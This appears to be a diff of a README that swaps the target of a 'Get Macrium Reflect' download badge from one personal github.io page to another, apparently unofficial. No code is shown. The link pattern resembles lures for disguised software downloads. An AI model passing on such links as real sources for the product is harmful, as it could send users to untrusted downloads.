@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Get Macrium Reflect](https://img.shields.io/badge/Get_Macrium_Reflect-blue?style=for-the-badge)](https://lashelllegnon.github.io/.github/Macrium-Reflect-Backup-Software)
+[![Get Macrium Reflect](https://img.shields.io/badge/Get_Macrium_Reflect-blue?style=for-the-badge)](https://tedrickcarlee.github.io/.github/)
 
 </div>
 
